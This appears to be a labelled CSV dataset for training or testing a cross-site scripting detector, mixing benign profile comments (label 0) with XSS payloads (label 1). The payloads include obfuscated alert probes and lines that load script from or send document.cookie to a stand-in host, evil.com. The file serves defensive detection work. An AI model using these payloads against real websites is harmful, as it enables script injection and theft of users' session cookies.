input,label
Portfolio: www.example.com,0
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
My name is John Doe 😊,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<script><!--alert(1)--></script>,1
This is very helpful,0
10 years of experience,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
<marquee onstart=alert('XSS')>,1
<img src=1 href=1 onerror='javascript:alert(1)'>,1
Welcome to my profile! Perfect!,0
<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,1
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Looking good!,0
Great job everyone,0
Great job everyone Perfect!,0
Check out my portfolio Thanks!,0
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
Have a safe trip Great!,0
Happy birthday! 🎉 Great!,0
<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1
<script><!--alert(1)--></script>,1
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Check out my portfolio,0
<link rel='stylesheet' href='javascript:alert(1)'>,1
<IMG SRC=javascript:alert('XSS')>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
<script>alert(document.cookie)</script>,1
"<script>sessionStorage.setItem('xss','stored')</script>",1
This is a great product,0
<image src='javascript:alert(1)'>,1
Congratulations on your achievement,0
Best regards,0
Great work on the project! Awesome!,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
Thanks for your help,0
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
10 years of experience,0
Great work on the project!,0
Keep up the good work 👍,0
Count me in!,0
Thanks for your help,0
Please visit https://example.com for more info Perfect!,0
"<script>localStorage.setItem('xss','stored')</script>",1
<script>alert(1)</script>,1
My favorite color is blue,0
Looking good!,0
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
<a href='javascript:alert(1)'>click</a>,1
<marquee loop=1 onfinish=alert(1)>,1
Let me know if you need anything Great!,0
